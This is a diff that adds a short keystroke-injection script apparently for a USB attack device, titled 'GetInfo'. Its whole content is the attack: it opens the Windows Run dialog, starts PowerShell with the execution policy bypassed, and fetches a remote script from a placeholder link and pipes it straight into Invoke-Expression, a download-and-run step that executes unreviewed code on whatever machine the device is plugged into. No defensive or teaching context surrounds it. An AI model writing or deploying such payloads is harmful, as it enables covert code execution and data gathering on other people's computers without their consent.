@@ -1,0 +1,5 @@
+﻿REM GetInfo
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'link-to/getinfo.ps1' | iex"
+ENTER
